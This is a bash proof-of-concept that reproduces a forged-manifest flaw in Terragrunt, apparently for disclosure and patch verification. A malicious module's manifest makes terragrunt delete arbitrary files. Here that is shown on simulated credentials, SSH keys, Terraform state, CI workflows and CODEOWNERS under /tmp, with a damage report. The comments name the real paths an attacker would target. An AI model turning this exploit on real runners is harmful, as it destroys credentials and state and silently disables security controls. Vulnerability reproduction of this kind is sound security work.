#!/usr/bin/env bash
# High-impact variant of the forged-manifest attack.
#
# The manifest bug's primitive is os.Remove(absolute_path). One manifest
# can carry many entries, so a single attacker-published module can wipe
# every high-value file the terragrunt process can write to in one shot.
#
# This script lays down a SIMULATED victim filesystem under /tmp/repro-victim
# (real paths would be ~/.aws, ~/.ssh, $REPO/.github/workflows, etc -- we use
# /tmp so the demo never touches real credentials or workflow files), then
# forges a manifest that targets all of those simulated files at once.
#
# Categories targeted:
#   1. Cloud credentials       -> next deploy fails or silently re-auths to wrong principal
#   2. SSH private keys        -> CI runner loses git/ssh access on next checkout
#   3. Container/registry auth -> docker pull/push starts using anonymous auth
#   4. Terraform lockfiles     -> next plan unpins providers (dependency confusion window)
#   5. Terraform state         -> state loss; recovery needs out-of-band backup
#   6. CI workflow definitions -> security scans silently disabled until next review
#   7. CODEOWNERS              -> required-reviewer enforcement bypassed
#   8. Hooks scripts           -> deploy orchestration breaks at the next pipeline run
#
# Output is a damage report grouped by category.

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
TERRAGRUNT_BIN="${TERRAGRUNT_BIN:-terragrunt}"

VICTIM=/tmp/repro-victim
VHOME=$VICTIM/home/runner
VREPO=$VICTIM/repo

ATTACKER_WORK=$SCRIPT_DIR/.scratch/destructive-work
ATTACKER_REPO=$SCRIPT_DIR/.scratch/destructive.git
CONSUMER=$SCRIPT_DIR/.scratch/destructive-consumer

declare -A CATEGORIES=(
  [cloud-credentials]="$VHOME/.aws/credentials $VHOME/.gcp/application_default_credentials.json $VHOME/.config/gcloud/credentials.db"
  [ssh-private-keys]="$VHOME/.ssh/id_rsa $VHOME/.ssh/id_ed25519 $VHOME/.ssh/deploy_key"
  [container-auth]="$VHOME/.docker/config.json"
  [terraform-locks]="$VREPO/envs/prod/.terraform.lock.hcl $VREPO/envs/staging/.terraform.lock.hcl $VREPO/envs/dev/.terraform.lock.hcl"
  [terraform-state]="$VREPO/envs/prod/terraform.tfstate $VREPO/envs/prod/terraform.tfstate.backup"
  [ci-workflows]="$VREPO/.github/workflows/security-scan.yml $VREPO/.github/workflows/required-checks.yml"
  [codeowners]="$VREPO/CODEOWNERS $VREPO/.github/CODEOWNERS"
  [hooks-scripts]="$VREPO/scripts/before-apply.sh $VREPO/scripts/after-apply.sh"
)

echo "==> step 1: planting simulated victim filesystem under $VICTIM"
rm -rf "$VICTIM"
mkdir -p "$VHOME"/{.aws,.gcp,.config/gcloud,.ssh,.docker} \
         "$VREPO"/envs/{prod,staging,dev} \
         "$VREPO"/.github/workflows \
         "$VREPO"/scripts

ALL_TARGETS=()
for cat in "${!CATEGORIES[@]}"; do
  for f in ${CATEGORIES[$cat]}; do
    mkdir -p "$(dirname "$f")"
    printf 'fake-%s-content\n' "$cat" > "$f"
    ALL_TARGETS+=("$f")
  done
done
echo "    planted ${#ALL_TARGETS[@]} files across ${#CATEGORIES[@]} categories"

echo "==> step 2: building forge tool"
( cd "$SCRIPT_DIR/forge" && go build -o "$SCRIPT_DIR/forge_bin" . ) >/dev/null

echo "==> step 3: assembling attacker module worktree with all targets in one manifest"
rm -rf "$ATTACKER_WORK" "$ATTACKER_REPO" "$CONSUMER"
mkdir -p "$ATTACKER_WORK" "$CONSUMER"
cp "$SCRIPT_DIR/attacker-module/main.tf" "$ATTACKER_WORK/main.tf"
"$SCRIPT_DIR/forge_bin" "$ATTACKER_WORK/.terragrunt-module-manifest" "${ALL_TARGETS[@]}" >/dev/null
echo "    forged manifest with ${#ALL_TARGETS[@]} entries"

echo "==> step 4: committing worktree to a bare git repo"
( cd "$ATTACKER_WORK" \
  && git init -q -b main . \
  && git config user.email repro@example.com \
  && git config user.name  repro \
  && git add -A \
  && git commit -q -m destructive )
git clone -q --bare "$ATTACKER_WORK" "$ATTACKER_REPO"

echo "==> step 5: writing consumer/terragrunt.hcl"
cat > "$CONSUMER/terragrunt.hcl" <<EOF
terraform {
  source = "git::file://$ATTACKER_REPO"
}
EOF

echo "==> step 6: invoking terragrunt"
echo "    binary: $($TERRAGRUNT_BIN --version 2>&1 | head -1)"
( cd "$CONSUMER" && "$TERRAGRUNT_BIN" run -- init -backend=false ) >/dev/null 2>&1 || true

echo
echo "==> step 7: damage report"
total_planted=0
total_destroyed=0
for cat in cloud-credentials ssh-private-keys container-auth terraform-locks terraform-state ci-workflows codeowners hooks-scripts; do
  planted=0
  destroyed=0
  for f in ${CATEGORIES[$cat]}; do
    planted=$((planted + 1))
    test ! -f "$f" && destroyed=$((destroyed + 1))
  done
  total_planted=$((total_planted + planted))
  total_destroyed=$((total_destroyed + destroyed))

  status="ok"
  (( destroyed > 0 )) && status="DESTROYED"
  printf '    %-22s %d/%d %s\n' "$cat" "$destroyed" "$planted" "$status"
done

echo
echo "    TOTAL                  $total_destroyed/$total_planted files destroyed"

echo
if (( total_destroyed > 0 )); then
  echo "*** VULNERABLE *** one forged manifest wiped $total_destroyed real-shaped CI artifacts."
  echo "    On a real runner the same payload would have hit the corresponding paths"
  echo "    under \$HOME and the workspace root."
  rc=2
else
  echo "*** PATCHED *** all $total_planted artifacts survived. The forged manifest was either"
  echo "    deleted by Layer 2 before being read, or every entry was rejected by Layer 1's"
  echo "    containment check."
  rc=0
fi

echo
echo "Inspect the forged manifest with:"
echo "  hexdump -C $ATTACKER_WORK/.terragrunt-module-manifest | head -40"
echo
echo "Cleanup:"
echo "  rm -rf $VICTIM"
echo "  ./cleanup.sh"

exit "$rc"
